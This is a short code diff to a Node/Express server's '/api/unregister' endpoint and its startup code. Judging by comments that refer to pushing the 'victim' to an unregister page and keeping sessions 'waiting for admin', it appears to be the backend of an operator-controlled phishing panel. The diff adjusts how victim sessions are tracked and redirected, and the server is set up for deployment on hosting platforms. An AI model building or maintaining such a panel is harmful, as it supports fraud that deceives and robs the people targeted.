@@ -203,9 +203,11 @@ app.post('/api/unregister', async (req, res) => {
     const { sid } = req.body;
     if (!sessionsMap.has(sid)) return res.sendStatus(404);
     const v = sessionsMap.get(sid);
+
+    // mark clicked **now**
     v.unregisterClicked = true;
-    v.status = 'wait';
-    v.page   = 'unregister.html';   // ← pushes victim to unregister step
+    v.status = 'wait';            // keep waiting for admin
+    // page is already 'unregister.html' from earlier flow – do NOT overwrite
     sessionActivity.set(sid, Date.now());
     res.sendStatus(200);
   } catch (err) {
@@ -315,3 +317,4 @@ app.listen(PORT, '0.0.0.0', () => {
   console.log(`Server running on port ${PORT}`);
   currentDomain = process.env.RAILWAY_STATIC_URL || process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`;
 });
+
